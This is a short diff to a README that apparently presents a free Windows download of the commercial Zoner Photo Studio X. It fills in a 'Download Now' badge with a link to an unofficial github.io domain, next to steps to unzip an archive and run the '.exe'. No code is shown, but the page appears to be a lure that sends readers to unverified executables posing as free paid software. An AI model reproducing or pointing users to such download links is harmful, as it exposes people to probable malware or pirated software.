@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://zoner-photo-studio-x-windows-free.github.io/.github/)
 
 ## 📸 Overview
 ![zoner-photo-studio-free-editing](https://github.com/user-attachments/assets/50984012-243d-4596-96d1-253d9dbb1767)
